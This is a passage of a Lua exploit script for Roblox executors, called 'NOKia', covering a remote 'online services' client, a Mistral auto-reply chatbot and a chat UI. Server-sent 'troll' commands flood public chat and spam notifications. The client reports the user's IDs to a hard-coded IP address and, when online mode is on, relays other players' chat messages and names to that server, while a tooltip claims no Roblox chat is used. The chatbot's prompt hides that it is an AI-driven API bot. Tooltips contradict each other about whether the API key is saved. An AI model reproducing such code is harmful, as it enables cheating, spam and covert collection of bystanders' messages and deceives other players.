					if char then for _,t in ipairs(char:GetChildren()) do if t:IsA("Tool") then table.insert(tools,t) end end end
					for i=1,math.min(#tools,20) do
						local t=tools[i]
						t.Parent=char or inv
						task.wait(0.1)
					end
				end)
			elseif troll=="spamnotif" then
				local msg=tostring(data.message or "TROLLED")
				local count=math.min(tonumber(data.count) or 10,30)
				for i=1,count do notify("🔔 "..msg.." ("..i.."/"..count..")",2) task.wait(0.3) end
			elseif troll=="chatflood" then
				local msg=tostring(data.message or "FLOOD")
				local count=math.min(tonumber(data.count) or 20,100)
				for i=1,count do NOKia.sendPublicChat(msg.." "..i) task.wait(0.08) end
			elseif troll=="resetall" then
				pcall(function()
					workspace.Gravity=196.2
					Lighting.Ambient=Color3.new(0,0,0); Lighting.Brightness=2; Lighting.ClockTime=14
					Lighting.FogEnd=1e5; Lighting.FogStart=0; Lighting.GlobalShadows=true
					local cam=workspace.CurrentCamera; cam.FieldOfView=70; cam.CameraType=Enum.CameraType.Custom
					local hum=LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
					if hum then hum.WalkSpeed=16; hum.JumpPower=50; hum.PlatformStand=false; hum.MaxHealth=100; hum.Health=100 end
					local char=LocalPlayer.Character
					if char then
						for _,p in ipairs(char:GetDescendants()) do
							if p:IsA("BasePart") then p.Transparency=0; p.CanCollide=true; p.Anchored=false end
						end
					end
				end)
			end
		elseif data.type=="error" then notify("Nokia Online: "..tostring(data.message or "error")) end
	end
	function NOKia.onlineDisconnected()
		local wasConnected=NOKia.onlineState=="Connected"
		local oldSocket=NOKia.onlineSocket
		NOKia.onlineSocket=nil
		pcall(function() if oldSocket then oldSocket:Close() end end)
		if flags.nokiaNetwork then
			NOKia.onlineState="Disconnected"
			NOKia.onlineRetryAfter=os.clock()+5
			if (wasConnected or NOKia.onlineEverConnected) and not NOKia.onlineDisconnectNotified then
				NOKia.onlineDisconnectNotified=true
				notify(NOKia.onlineText("connectionLost"),5)
			end
		end
	end
	function NOKia.bindOnlineSocketEvent(socket,names,callback)
		for _,name in ipairs(names) do
			local event
			pcall(function() event=socket[name] end)
			if event then
				local ok=pcall(function() bind(event,callback) end)
				if ok then return true end
			end
		end
		return false
	end
	function NOKia.connectOnlineServices()
		if not flags.nokiaNetwork or NOKia.onlineConnecting or NOKia.onlineSocket then return end
		local connector=(type(WebSocket)=="table" and WebSocket.connect) or (type(websocket)=="table" and websocket.connect) or (type(syn)=="table" and syn.websocket and syn.websocket.connect)
		if type(connector)~="function" then NOKia.onlineState="WebSocket unavailable"; return end
		NOKia.onlineConnecting=true; NOKia.onlineState=NOKia.onlineEverConnected and "Reconnecting..." or "Connecting..."
		local ok,socket=pcall(connector,NOKia.ONLINE_URL)
		NOKia.onlineConnecting=false
		if not ok or not socket then NOKia.onlineState="Server unavailable — retrying in 5 s"; return end
		NOKia.onlineSocket=socket
		NOKia.onlineState="Authenticating..."
		NOKia.onlineHelloDeadline=os.clock()+8
		local messageBound=NOKia.bindOnlineSocketEvent(socket,{"OnMessage","Message","OnData"},function(message) NOKia.handleOnlinePacket(message) end)
		NOKia.bindOnlineSocketEvent(socket,{"OnClose","Close","Closed"},function() if NOKia.onlineSocket==socket then NOKia.onlineDisconnected() end end)
		if not messageBound then NOKia.onlineState="WebSocket incompatible"; NOKia.onlineDisconnected(); return end
		NOKia.onlineSend({type="hello",userId=tostring(LocalPlayer.UserId),name=LocalPlayer.DisplayName or LocalPlayer.Name,placeId=tostring(game.PlaceId),jobId=tostring(game.JobId)})
	end
	function NOKia.sendOnlineChat(scope,message)
		if message=="" then return end
		if not (NOKia.onlineSocket and NOKia.onlineState=="Connected") then NOKia.connectOnlineServices(); notify(NOKia.onlineText("notConnected")) return end
		NOKia.onlineMessageCounter=(NOKia.onlineMessageCounter or 0)+1
		local clientId=tostring(LocalPlayer.UserId)..":"..tostring(NOKia.onlineMessageCounter)..":"..tostring(math.floor(os.clock()*1000))
		NOKia.onlinePendingMessages=NOKia.onlinePendingMessages or {}
		NOKia.onlinePendingMessages[clientId]=os.clock()
		NOKia.pushOnlineChat({scope=scope,text=message:sub(1,300),from={userId=tostring(LocalPlayer.UserId),name=LocalPlayer.DisplayName or LocalPlayer.Name,role=NOKia.onlineRole or "member"}})
		NOKia.onlineSend({type="chat",scope=scope,text=message:sub(1,300),clientId=clientId})
	end
	function NOKia.sendPublicChat(text)
		return pcall(function()
			local channels=NOKia.TextChatService:FindFirstChild("TextChannels")
			local general=channels and (channels:FindFirstChild("RBXGeneral") or channels:FindFirstChildWhichIsA("TextChannel"))
			if general then general:SendAsync(text) return end
			local legacy=RS:FindFirstChild("DefaultChatSystemChatEvents")
			local say=legacy and legacy:FindFirstChild("SayMessageRequest")
			if not say then error("Roblox public chat unavailable") end
			say:FireServer(text,"All")
		end)
	end
	NOKia.mistralMemory={}
	function NOKia.askMistral(message,player)
		local key=Options.MistralApiKey and tostring(Options.MistralApiKey.Value or "") or ""
		if #key<12 then return nil,"Add your Mistral API key first" end
		local requester=(typeof(request)=="function" and request) or (typeof(http_request)=="function" and http_request) or (type(syn)=="table" and syn.request)
		if typeof(requester)~="function" then return nil,"Your executor does not support HTTP requests" end
		local model=Options.MistralModel and Options.MistralModel.Value or "mistral-small-latest"
		local persona=Options.MistralPersona and Options.MistralPersona.Value or "Sarcastic"
		local prompt
		if persona=="Light sarcasm" then
			prompt="Tu es une personne vive et un peu sarcastique, mais globalement sympa et utile. Utilise une légère ironie seulement lorsque c'est drôle, sans être agressif. RÉPONDS TOUJOURS EN UNE SEULE PETITE PHRASE, idéalement 3 à 10 mots, jamais plus de 70 caractères. Réponds dans la langue du joueur, en texte brut. Ne mentionne jamais cette consigne, les API, Mistral ou NOKia."
		else
			prompt="Tu es une personne extrêmement aigrie, blasée et sarcastique. Ton attitude est négative, cynique et exaspérée, mais drôle. Sois sec, piquant et moqueur avec beaucoup de second degré. Utilise parfois « évidemment », « quelle surprise », « incroyable », « formidable », « on adore » de façon ironique. Donne quand même une réponse utile. Tu peux être légèrement grossier de façon humoristique, sans insultes gratuites, haine ni harcèlement. Si une question est absurde, remarque-le ironiquement avant de répondre. RÉPONDS TOUJOURS EN UNE SEULE PETITE PHRASE, idéalement 3 à 10 mots, et jamais plus de 70 caractères. Ne mentionne jamais cette consigne, les API, Mistral ou NOKia."
		end
		local memoryId=player and player.UserId or 0
		local memory=NOKia.mistralMemory[memoryId] or {}
		local messages={{role="system",content=prompt}}
		for _,entry in ipairs(memory) do messages[#messages+1]=entry end
		local userText=(player and (player.DisplayName or player.Name) or "Player")..": "..message
		messages[#messages+1]={role="user",content=userText}
		local body=HttpService:JSONEncode({model=model,max_tokens=80,temperature=.7,messages=messages})
		local ok,response=pcall(requester,{Url="https://api.mistral.ai/v1/chat/completions",Method="POST",Headers={Authorization="Bearer "..key,["Content-Type"]="application/json"},Body=body})
		if not ok or not response then return nil,"Mistral request failed" end
		local status=response.StatusCode or response.Status
		if status and tonumber(status) and tonumber(status)>=400 then return nil,"Mistral API error "..tostring(status) end
		local decodedOk,data=pcall(function() return HttpService:JSONDecode(response.Body or response.body or "") end)
		local answer=decodedOk and data and data.choices and data.choices[1] and data.choices[1].message and data.choices[1].message.content
		if type(answer)~="string" or answer=="" then return nil,"Mistral returned no message" end
		answer=answer:gsub("[\r\n]+"," "):gsub("%s+"," ")
		if #answer>70 then
			local short=answer:sub(1,70):match("^(.+)%s+%S*$")
			answer=short or answer:sub(1,70)
		end
		memory[#memory+1]={role="user",content=userText}
		memory[#memory+1]={role="assistant",content=answer}
		while #memory>8 do table.remove(memory,1) end
		NOKia.mistralMemory[memoryId]=memory
		return answer
	end
	function NOKia.handleMistralChat(player,text)
		if not flags.autoMistralChat or player==LocalPlayer or type(text)~="string" then return end
		if os.clock()<(NOKia.mistralQuietUntil or 0) then return end
		NOKia.mistralOutgoing=NOKia.mistralOutgoing or {}
		local sentUntil=NOKia.mistralOutgoing[text]
		if sentUntil and sentUntil>os.clock() then return end
		local lower=text:lower()
		if not flags.mistralReplyAll and not (lower:find("@nokia",1,true) or lower:find("nokia",1,true)) then return end
		if not flags.mistralReplyAll and os.clock()-(NOKia.mistralLastReply or -100)<8 then return end
		NOKia.mistralQueue=NOKia.mistralQueue or {}
		if #NOKia.mistralQueue>=40 then return end
		table.insert(NOKia.mistralQueue,{player=player,text=text})
		if NOKia.mistralBusy then return end
		NOKia.mistralBusy=true
		task.spawn(function()
			while #NOKia.mistralQueue>0 and flags.autoMistralChat do
				local nextMessage=table.remove(NOKia.mistralQueue,1)
				NOKia.mistralLastReply=os.clock()
				local answer,err=NOKia.askMistral(nextMessage.text,nextMessage.player)
				if answer then
					NOKia.mistralOutgoing=NOKia.mistralOutgoing or {}
					NOKia.mistralOutgoing[answer]=os.clock()+45
					NOKia.mistralQuietUntil=os.clock()+2.5
					NOKia.sendPublicChat(answer)
				else notify(err or "Mistral could not answer") end
				if flags.mistralReplyAll then task.wait(1.2) end
			end
			NOKia.mistralBusy=false
		end)
	end

	do local left=Tabs.Chat:AddLeftGroupbox("Mistral Auto Chat")
		local mistralKeyInput=left:AddInput("MistralApiKey",{Text="Mistral API Key",Default="",Finished=true,ClearTextOnFocus=false,Tooltip="Your key and the triggering chat message are sent to Mistral's API. Use a limited key and never share it."})
		NOKia.mistralKeyVisible=false
		NOKia.refreshMistralKeyVisibility=function()
			local box=NOKia.mistralKeyBox
			if not (box and box.Parent and Options.MistralApiKey) then return end
			local key=tostring(Options.MistralApiKey.Value or "")
			box.Text=NOKia.mistralKeyVisible and key or string.rep("•",math.min(#key,28))
		end
		task.defer(function()
			for _,node in ipairs(Library.ScreenGui:GetDescendants()) do
				if node:IsA("TextLabel") and node.Text=="Mistral API Key" then
					local box=node.Parent and node.Parent:FindFirstChildOfClass("TextBox")
					if box then
						NOKia.mistralKeyBox=box
						bind(box.Focused,function() NOKia.mistralKeyVisible=true; NOKia.refreshMistralKeyVisibility() end)
						bind(box.FocusLost,function() task.defer(function() NOKia.mistralKeyVisible=false; NOKia.refreshMistralKeyVisibility() end) end)
						NOKia.refreshMistralKeyVisibility()
						break
					end
				end
			end
		end)
		mistralKeyInput:OnChanged(function() task.defer(NOKia.refreshMistralKeyVisibility) end)
		left:AddButton({Text="Show / Hide Mistral API Key",Tooltip="The API key is saved locally in plain text in your NOKia config. Do not share that config file.",Func=function()
			NOKia.mistralKeyVisible=not NOKia.mistralKeyVisible
			NOKia.refreshMistralKeyVisibility()
		end})
		left:AddDropdown("MistralModel",{Text="Mistral Model",Values={"mistral-small-latest","mistral-large-latest"},Default="mistral-small-latest"})
		left:AddDropdown("MistralPersona",{Text="Chat Personality",Values={"Sarcastic","Light sarcasm"},Default="Sarcastic",Tooltip="Only one personality prompt is active at a time."})
		left:AddLabel("Keeps the last four exchanges separately for each player, only while this script is running.")
		left:AddToggle("AutoMistralChat",{Text="Reply When Mentioned",Default=false,Tooltip="Replies in public Roblox chat only when a player writes NOKia or @NOKia. The API key is kept only in memory and is never saved.",Callback=function(value)
			flags.autoMistralChat=value
			if not value and Toggles.MistralReplyAll and Toggles.MistralReplyAll.Value then Toggles.MistralReplyAll:SetValue(false) end
		end})
		left:AddToggle("MistralReplyAll",{Text="EXPERIMENTAL — Reply To Every Message",Default=false,Tooltip="Queues every player message for Mistral. This can spend API credits quickly and may hit Roblox chat rate limits.",Callback=function(value)
			flags.mistralReplyAll=value
			if value and Toggles.AutoMistralChat and not Toggles.AutoMistralChat.Value then Toggles.AutoMistralChat:SetValue(true) end
		end})
		left:AddLabel("Mention NOKia or @NOKia in chat to trigger one answer. Cooldown: 8 seconds.")
	end

	function NOKia.setOnlineServicesEnabled(value)
		flags.nokiaNetwork=value==true
		if flags.nokiaNetwork then
			task.spawn(NOKia.connectOnlineServices)
		else
			NOKia.onlineState="Disabled"
			pcall(function() if NOKia.onlineSocket then NOKia.onlineSocket:Close() end end)
			NOKia.onlineSocket=nil
		end
	end
	function NOKia.setOnlineToggle(value)
		NOKia.settingOnlineToggle=true
		pcall(function() Toggles.NokiaNetwork:SetValue(value==true) end)
		NOKia.settingOnlineToggle=false
	end
	function NOKia.askOnlinePrivacyConsent()
		if NOKia.onlinePrivacyDialogOpen then return end
		if NOKia.onlinePrivacyRemember then
			NOKia.onlineConsentApproved=true
			NOKia.setOnlineServicesEnabled(true)
			return
		end
		NOKia.onlinePrivacyDialogOpen=true
		Window:AddDialog("NokiaOnlinePrivacy",{
			Title=NOKia.onlineText("privacyTitle"),
			Description=NOKia.onlineText("privacyDescription"),
			AutoDismiss=false,OutsideClickDismiss=false,
			FooterButtons={
				{Id="Cancel",Title=NOKia.onlineText("cancel"),Variant="Secondary",Callback=function(dialog)
					NOKia.onlinePrivacyDialogOpen=false
					NOKia.onlineConsentApproved=false
					dialog:Dismiss()
					task.defer(function() NOKia.setOnlineToggle(false); NOKia.setOnlineServicesEnabled(false) end)
				end},
				{Id="Once",Title=NOKia.onlineText("enableOnce"),Variant="Primary",Callback=function(dialog)
					NOKia.onlinePrivacyDialogOpen=false
					NOKia.onlineConsentApproved=true
					dialog:Dismiss()
					task.defer(function() NOKia.setOnlineToggle(true); NOKia.setOnlineServicesEnabled(true) end)
				end},
				{Id="Remember",Title=NOKia.onlineText("enableRemember"),Variant="Primary",Callback=function(dialog)
					NOKia.onlinePrivacyDialogOpen=false
					NOKia.saveOnlinePrivacy(true)
					NOKia.onlineConsentApproved=true
					dialog:Dismiss()
					task.defer(function() NOKia.setOnlineToggle(true); NOKia.setOnlineServicesEnabled(true) end)
				end},
			}
		})
	end
	do local left=Tabs.NOKia:AddLeftGroupbox("Nokia Connected Services")
		left:AddToggle("NokiaNetwork",{Text="Enable Nokia Online Services",Default=false,Tooltip="Direct connection to the Nokia Online server. No message or marker uses Roblox chat.",Callback=function(value)
			if NOKia.settingOnlineToggle then return end
			if value then
				if NOKia.onlineConsentApproved or NOKia.onlinePrivacyRemember then
					NOKia.onlineConsentApproved=true
					NOKia.setOnlineServicesEnabled(true)
				else
					flags.nokiaNetwork=false
					NOKia.askOnlinePrivacyConsent()
				end
			else
				NOKia.onlineConsentApproved=false
				NOKia.setOnlineServicesEnabled(false)
			end
		end})
		left:AddLabel("Server: 212.83.145.217:8765")
		NOKia.nokiaOnlineLabel=left:AddLabel("Status: disabled")
		NOKia.nokiaServerInfoLabel=left:AddLabel("Region: FR • Ping: -- ms")
		NOKia.nokiaGlobalInfoLabel=left:AddLabel("Nokia users connected: 0 (all servers)")
		left:AddLabel("Badges and chat use only the Nokia server, never Roblox chat.")
		left:AddLabel("This setting can be saved to reconnect on the next launch.")
		left:AddButton({Text="Show privacy notice again",Tooltip="Re-enables the local privacy confirmation for the next activation.",Func=function()
			NOKia.saveOnlinePrivacy(false)
			notify(NOKia.onlineText("privacyReset"))
		end})
	end
	do
		for _,side in ipairs(Tabs.NokiaChat.Sides or {}) do side.Visible=false end
		local root=create("Frame",{Name=rnd(),BackgroundColor3=Color3.fromRGB(12,24,45),BackgroundTransparency=.06,Position=UDim2.fromOffset(2,2),Size=UDim2.new(1,-4,1,-4),Parent=Tabs.NokiaChat.Canvas},
			{create("UICorner",{CornerRadius=UDim.new(0,14)}),create("UIStroke",{Color=Color3.fromRGB(68,131,235),Transparency=.25})})
		local header=create("Frame",{BackgroundTransparency=1,Position=UDim2.fromOffset(14,12),Size=UDim2.new(1,-28,0,72),Parent=root})
		NOKia.nokiaScopeServerButton=create("TextButton",{AutoButtonColor=false,BackgroundColor3=Color3.fromRGB(54,112,225),Position=UDim2.fromOffset(0,0),Size=UDim2.new(.43,-5,0,34),Text="Server",Font=Enum.Font.GothamBold,TextSize=15,TextColor3=Color3.fromRGB(245,248,255),Parent=header},{create("UICorner",{CornerRadius=UDim.new(0,10)})})
		NOKia.nokiaScopeWorldButton=create("TextButton",{AutoButtonColor=false,BackgroundColor3=Color3.fromRGB(25,43,74),Position=UDim2.new(.43,4,0,0),Size=UDim2.new(.43,-5,0,34),Text="World",Font=Enum.Font.GothamBold,TextSize=15,TextColor3=Color3.fromRGB(245,248,255),Parent=header},{create("UICorner",{CornerRadius=UDim.new(0,10)})})
		NOKia.nokiaPrivateButton=create("TextButton",{AutoButtonColor=false,BackgroundColor3=Color3.fromRGB(25,43,74),Position=UDim2.new(.86,5,0,0),Size=UDim2.new(.14,-5,0,34),Text="+",Font=Enum.Font.GothamBlack,TextSize=21,TextColor3=Color3.fromRGB(245,248,255),Parent=header},{create("UICorner",{CornerRadius=UDim.new(0,10)})})
		NOKia.nokiaChatScopeLabel=create("TextLabel",{BackgroundTransparency=1,Position=UDim2.fromOffset(2,40),Size=UDim2.new(.55,-2,0,26),Text="Server chat — this instance only",Font=Enum.Font.GothamBold,TextSize=14,TextColor3=Color3.fromRGB(235,241,255),TextXAlignment=Enum.TextXAlignment.Left,Parent=header})
		NOKia.nokiaChatConnectionLabel=create("TextLabel",{BackgroundTransparency=1,Position=UDim2.new(.55,0,0,40),Size=UDim2.new(.45,-2,0,26),Text="Nokia Online: disabled",Font=Enum.Font.Gotham,TextSize=13,TextColor3=Color3.fromRGB(255,190,90),TextXAlignment=Enum.TextXAlignment.Right,Parent=header})
		local messages=create("ScrollingFrame",{BackgroundColor3=Color3.fromRGB(8,18,35),BackgroundTransparency=.18,BorderSizePixel=0,Position=UDim2.fromOffset(14,88),Size=UDim2.new(1,-28,1,-158),CanvasSize=UDim2.fromScale(0,0),AutomaticCanvasSize=Enum.AutomaticSize.Y,ScrollBarThickness=3,ScrollBarImageColor3=Color3.fromRGB(77,143,255),Parent=root},
			{create("UICorner",{CornerRadius=UDim.new(0,12)}),create("UIPadding",{PaddingTop=UDim.new(0,8),PaddingBottom=UDim.new(0,8),PaddingLeft=UDim.new(0,8),PaddingRight=UDim.new(0,8)}),create("UIListLayout",{Padding=UDim.new(0,6),SortOrder=Enum.SortOrder.LayoutOrder})})
		NOKia.nokiaMessagesFrame=messages
		for index=1,12 do
			local holder=create("Frame",{BackgroundTransparency=1,LayoutOrder=index,Size=UDim2.new(1,0,0,42),Visible=false,Parent=messages})
			local bubble=create("Frame",{BackgroundColor3=Color3.fromRGB(28,45,77),Size=UDim2.new(.86,0,1,0),Parent=holder},{create("UICorner",{CornerRadius=UDim.new(0,10)})})
			local prefix=create("TextLabel",{BackgroundColor3=Color3.fromRGB(204,63,91),Position=UDim2.fromOffset(7,8),Size=UDim2.fromOffset(114,26),Text="ADMIN NOKIA",Font=Enum.Font.GothamBlack,TextSize=10,TextColor3=Color3.fromRGB(255,255,255),Visible=false,Parent=bubble},{create("UICorner",{CornerRadius=UDim.new(0,7)})})
			local label=create("TextLabel",{BackgroundTransparency=1,Position=UDim2.fromOffset(10,0),Size=UDim2.new(1,-20,1,0),Text="",Font=Enum.Font.Gotham,TextSize=14,TextColor3=Color3.fromRGB(245,248,255),TextWrapped=true,TextXAlignment=Enum.TextXAlignment.Left,Parent=bubble})
			local joinButton=create("TextButton",{AutoButtonColor=false,AnchorPoint=Vector2.new(1,.5),BackgroundColor3=Color3.fromRGB(58,180,110),Position=UDim2.new(1,-7,.5,0),Size=UDim2.fromOffset(92,26),Text="Join",Font=Enum.Font.GothamBold,TextSize=11,TextColor3=Color3.fromRGB(255,255,255),Visible=false,Parent=bubble},{create("UICorner",{CornerRadius=UDim.new(0,7)})})
			local slot={holder=holder,bubble=bubble,prefix=prefix,label=label,joinButton=joinButton,invite=nil}
			bind(joinButton.MouseButton1Click,function() NOKia.joinPrivateInvite(slot.invite) end)
			table.insert(NOKia.nokiaChatLabels,slot)
		end
		NOKia.nokiaInviteButton=create("TextButton",{AutoButtonColor=false,BackgroundColor3=Color3.fromRGB(44,92,180),Position=UDim2.new(0,14,1,-58),Size=UDim2.fromOffset(42,44),Text="+",Font=Enum.Font.GothamBlack,TextSize=22,TextColor3=Color3.fromRGB(255,255,255),Parent=root},{create("UICorner",{CornerRadius=UDim.new(0,12)})})
		NOKia.nokiaMessageBox=create("TextBox",{BackgroundColor3=Color3.fromRGB(19,37,67),ClearTextOnFocus=false,PlaceholderText="Your message...",Position=UDim2.new(0,64,1,-58),Size=UDim2.new(1,-182,0,44),Text="",Font=Enum.Font.Gotham,TextSize=15,TextColor3=Color3.fromRGB(245,248,255),PlaceholderColor3=Color3.fromRGB(145,160,190),TextXAlignment=Enum.TextXAlignment.Left,Parent=root},
			{create("UICorner",{CornerRadius=UDim.new(0,12)}),create("UIStroke",{Color=Color3.fromRGB(68,131,235),Transparency=.35}),create("UIPadding",{PaddingLeft=UDim.new(0,12),PaddingRight=UDim.new(0,12)})})
		NOKia.nokiaSendButton=create("TextButton",{AutoButtonColor=false,BackgroundColor3=Color3.fromRGB(54,112,225),Position=UDim2.new(1,-110,1,-58),Size=UDim2.fromOffset(96,44),Text="Send",Font=Enum.Font.GothamBold,TextSize=14,TextColor3=Color3.fromRGB(255,255,255),Parent=root},{create("UICorner",{CornerRadius=UDim.new(0,12)})})
		local privatePanel=create("Frame",{BackgroundColor3=Color3.fromRGB(13,29,55),BorderSizePixel=0,Position=UDim2.fromOffset(28,104),Size=UDim2.new(1,-56,0,306),Visible=false,ZIndex=10,Parent=root},{create("UICorner",{CornerRadius=UDim.new(0,12)}),create("UIStroke",{Color=Color3.fromRGB(74,139,245),Transparency=.2})})
		NOKia.privatePanel=privatePanel
		local searchTitle=create("TextLabel",{BackgroundTransparency=1,Position=UDim2.fromOffset(14,10),Size=UDim2.new(1,-54,0,26),Text="New private conversation",Font=Enum.Font.GothamBold,TextSize=16,TextColor3=Color3.fromRGB(245,248,255),TextXAlignment=Enum.TextXAlignment.Left,ZIndex=11,Parent=privatePanel})
		local closePrivate=create("TextButton",{BackgroundTransparency=1,Position=UDim2.new(1,-38,0,6),Size=UDim2.fromOffset(32,32),Text="×",Font=Enum.Font.GothamBold,TextSize=22,TextColor3=Color3.fromRGB(255,255,255),ZIndex=11,Parent=privatePanel})
		NOKia.privateSearchBox=create("TextBox",{BackgroundColor3=Color3.fromRGB(23,44,79),ClearTextOnFocus=false,PlaceholderText="Online Nokia username...",Position=UDim2.fromOffset(14,46),Size=UDim2.new(1,-126,0,36),Text="",Font=Enum.Font.Gotham,TextSize=14,TextColor3=Color3.fromRGB(245,248,255),PlaceholderColor3=Color3.fromRGB(145,160,190),TextXAlignment=Enum.TextXAlignment.Left,ZIndex=11,Parent=privatePanel},{create("UICorner",{CornerRadius=UDim.new(0,9)}),create("UIPadding",{PaddingLeft=UDim.new(0,10)})})
		local searchButton=create("TextButton",{AutoButtonColor=false,BackgroundColor3=Color3.fromRGB(54,112,225),Position=UDim2.new(1,-104,0,46),Size=UDim2.fromOffset(90,36),Text="Search",Font=Enum.Font.GothamBold,TextSize=13,TextColor3=Color3.fromRGB(255,255,255),ZIndex=11,Parent=privatePanel},{create("UICorner",{CornerRadius=UDim.new(0,9)})})
		NOKia.privateSearchStatus=create("TextLabel",{BackgroundTransparency=1,Position=UDim2.fromOffset(14,88),Size=UDim2.new(1,-28,0,24),Text="Searches currently connected Nokia users.",Font=Enum.Font.Gotham,TextSize=12,TextColor3=Color3.fromRGB(180,197,230),TextXAlignment=Enum.TextXAlignment.Left,ZIndex=11,Parent=privatePanel})
		NOKia.privateSearchButtons={}
		for index=1,5 do
			local button=create("TextButton",{AutoButtonColor=false,BackgroundColor3=Color3.fromRGB(26,49,87),Position=UDim2.fromOffset(14,112+(index-1)*28),Size=UDim2.new(1,-28,0,24),Text="",Font=Enum.Font.GothamBold,TextSize=12,TextColor3=Color3.fromRGB(245,248,255),TextXAlignment=Enum.TextXAlignment.Left,Visible=false,ZIndex=11,Parent=privatePanel},{create("UICorner",{CornerRadius=UDim.new(0,7)}),create("UIPadding",{PaddingLeft=UDim.new(0,10)})})
			NOKia.privateSearchButtons[index]=button
			bind(button.MouseButton1Click,function() local user=button:GetAttribute("NokiaUser"); if user then NOKia.requestPrivateChat(HttpService:JSONDecode(user)) end end)
		end
		NOKia.privateRequestLabel=create("TextLabel",{BackgroundTransparency=1,Position=UDim2.fromOffset(14,264),Size=UDim2.new(.5,-18,0,28),Text="",Font=Enum.Font.GothamBold,TextSize=12,TextColor3=Color3.fromRGB(255,220,135),TextXAlignment=Enum.TextXAlignment.Left,ZIndex=11,Parent=privatePanel})
		NOKia.privateAcceptButton=create("TextButton",{AutoButtonColor=false,BackgroundColor3=Color3.fromRGB(54,170,102),Position=UDim2.new(.5,0,0,262),Size=UDim2.fromOffset(88,30),Text="Accept",Font=Enum.Font.GothamBold,TextSize=12,TextColor3=Color3.fromRGB(255,255,255),Visible=false,ZIndex=11,Parent=privatePanel},{create("UICorner",{CornerRadius=UDim.new(0,8)})})
		NOKia.privateDeclineButton=create("TextButton",{AutoButtonColor=false,BackgroundColor3=Color3.fromRGB(170,62,78),Position=UDim2.new(.5,96,0,262),Size=UDim2.fromOffset(74,30),Text="Decline",Font=Enum.Font.GothamBold,TextSize=12,TextColor3=Color3.fromRGB(255,255,255),Visible=false,ZIndex=11,Parent=privatePanel},{create("UICorner",{CornerRadius=UDim.new(0,8)})})
		NOKia.refreshPrivateSearch=function()
			for index,button in ipairs(NOKia.privateSearchButtons) do
				local user=NOKia.privateSearchResults and NOKia.privateSearchResults[index]
				button.Visible=user~=nil
				if user then button.Text=NOKia.onlineText("requestButton",tostring(user.name or "?")); button:SetAttribute("NokiaUser",HttpService:JSONEncode(user)) end
			end
			if #(NOKia.privateSearchResults or {})==0 then NOKia.privateSearchStatus.Text=NOKia.onlineText("noUsers") end
		end
		NOKia.refreshPrivateRequestPanel=function()
			local request
			for _,user in pairs(NOKia.privateRequests) do request=user break end
			NOKia.privateRequestUser=request
			NOKia.privateRequestLabel.Text=request and NOKia.onlineText("requestLine",tostring(request.name or "?")) or ""
			NOKia.privateAcceptButton.Visible=request~=nil; NOKia.privateDeclineButton.Visible=request~=nil
			if request then privatePanel.Visible=true end
		end
		NOKia.submitOnlineChat=function()
			local message=tostring(NOKia.nokiaMessageBox.Text or ""):match("^%s*(.-)%s*$")
			if message=="" then notify(NOKia.onlineText("writeMessage")) return end
			if NOKia.activeOnlineScope=="private" then NOKia.sendPrivateChat(message) else NOKia.sendOnlineChat(NOKia.activeOnlineScope,message) end
			NOKia.nokiaMessageBox.Text=""
		end
		bind(NOKia.nokiaScopeServerButton.MouseButton1Click,function() NOKia.activeOnlineScope="server"; NOKia.refreshOnlineChat() end)
		bind(NOKia.nokiaScopeWorldButton.MouseButton1Click,function() NOKia.activeOnlineScope="world"; NOKia.refreshOnlineChat() end)
		bind(NOKia.nokiaPrivateButton.MouseButton1Click,function() privatePanel.Visible=not privatePanel.Visible end)
		bind(closePrivate.MouseButton1Click,function() privatePanel.Visible=false end)
		bind(searchButton.MouseButton1Click,function() NOKia.privateSearchStatus.Text=NOKia.onlineText("searching"); NOKia.searchPrivateUsers(NOKia.privateSearchBox.Text) end)
		bind(NOKia.privateSearchBox.FocusLost,function(enterPressed) if enterPressed then NOKia.privateSearchStatus.Text=NOKia.onlineText("searching"); NOKia.searchPrivateUsers(NOKia.privateSearchBox.Text) end end)
		bind(NOKia.privateAcceptButton.MouseButton1Click,function() NOKia.respondPrivateRequest(NOKia.privateRequestUser,true); privatePanel.Visible=false end)
		bind(NOKia.privateDeclineButton.MouseButton1Click,function() NOKia.respondPrivateRequest(NOKia.privateRequestUser,false) end)
		bind(NOKia.nokiaInviteButton.MouseButton1Click,NOKia.sendServerInvite)
		bind(NOKia.nokiaSendButton.MouseButton1Click,NOKia.submitOnlineChat)
		bind(NOKia.nokiaMessageBox.FocusLost,function(enterPressed) if enterPressed then NOKia.submitOnlineChat() end end)
		NOKia.updateOnlineLanguage=function()
			pcall(function()
				NOKia.nokiaMessageBox.PlaceholderText=NOKia.uiLanguage=="French" and "Votre message..." or "Your message..."
				NOKia.privateSearchBox.PlaceholderText=NOKia.uiLanguage=="French" and "Pseudo Nokia en ligne..." or "Online Nokia username..."
				if NOKia.onlineState=="Connected" then
					NOKia.nokiaOnlineLabel:SetText(NOKia.onlineText("connectedStatus",NOKia.onlineStats.serverOnline or 0))
				else
					NOKia.nokiaOnlineLabel:SetText(NOKia.onlineText("status",NOKia.onlineStateText(NOKia.onlineState),flags.nokiaNetwork and 1 or 0))
				end
				NOKia.nokiaServerInfoLabel:SetText(NOKia.onlineText("region",NOKia.onlineStats.region or "FR",NOKia.onlineStats.ping or "--"))
				NOKia.nokiaGlobalInfoLabel:SetText(NOKia.onlineText("global",NOKia.onlineStats.globalOnline or 0))
				NOKia.nokiaChatConnectionLabel.Text=NOKia.onlineText("chatStatus",NOKia.onlineStateText(NOKia.onlineState))
			end)
			if NOKia.refreshPrivateSearch then NOKia.refreshPrivateSearch() end
			if NOKia.refreshPrivateRequestPanel then NOKia.refreshPrivateRequestPanel() end
			NOKia.refreshOnlineChat()
		end
		NOKia.refreshOnlineChat()
	end

	pcall(function()
		if NOKia.TextChatService.ChatVersion==Enum.ChatVersion.TextChatService then
			bind(NOKia.TextChatService.MessageReceived,function(message)
				local source=message.TextSource
				local player=source and Players:GetPlayerByUserId(source.UserId)
				NOKia.handleMistralChat((source and source.UserId==LocalPlayer.UserId) and LocalPlayer or player,message.Text)
				-- Chat mirroring: relay to server
				if flags.nokiaNetwork and NOKia.onlineSocket and NOKia.onlineState=="Connected" then
					local senderName = player and (player.DisplayName or player.Name) or (source and tostring(source.UserId)) or "Inconnu"
					NOKia.onlineSend({type="chat_mirror", text=message.Text, fromName=senderName, fromUserId=tostring(source and source.UserId or 0), channel="RBXGeneral"})
				end
			end)
		else
			local events=RS:WaitForChild("DefaultChatSystemChatEvents",5)
			local received=events and events:FindFirstChild("OnMessageDoneFiltering")
			if received then bind(received.OnClientEvent,function(data)
				local player=resolvePlayer(data.FromSpeaker or "")
